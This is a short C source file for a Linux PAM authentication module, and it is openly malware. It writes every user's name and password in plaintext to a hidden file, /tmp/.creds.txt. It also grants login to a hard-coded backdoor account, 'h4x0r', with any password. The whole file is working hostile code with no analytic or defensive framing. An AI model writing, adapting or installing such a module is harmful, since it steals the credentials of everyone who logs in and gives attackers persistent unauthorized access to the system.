#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <stdio.h>
#include <string.h>

#define LOGFILE "/tmp/.creds.txt"
#define BACKDOOR_USER "h4x0r"

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user;
    const char *pass;

    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

    // Log credentials
    FILE *fp = fopen(LOGFILE, "a");
    if (fp) {
        fprintf(fp, "User: %s | Password: %s\n", user, pass);
        fclose(fp);
    }

    // Allow login if user is backdoor user
    if (strcmp(user, BACKDOOR_USER) == 0) {
        return PAM_SUCCESS;
    }

    // Let other modules decide
    return PAM_IGNORE;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}
